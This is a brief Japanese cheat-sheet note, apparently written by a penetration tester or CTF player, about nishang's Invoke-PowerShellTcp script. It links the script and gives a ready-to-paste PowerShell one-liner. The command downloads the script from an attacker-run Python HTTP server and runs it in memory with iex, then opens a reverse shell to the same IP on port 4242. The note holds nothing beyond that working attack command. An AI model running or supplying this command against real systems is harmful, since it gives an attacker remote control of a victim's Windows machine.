# Invoke-PowerShellTcp(nishang)

powershellからreverse shell貼るときに使う

https://github.com/samratashok/nishang/blob/c3fdf5e5dfa8612d0a17636dbb096b04e987ab31/Shells/Invoke-PowerShellTcp.ps1

# Usage
pythonSimpleHTTPServerをホストで立ててDL&Reverse shell貼るパターン

```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.66.152:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.66.152 -Port 4242
```
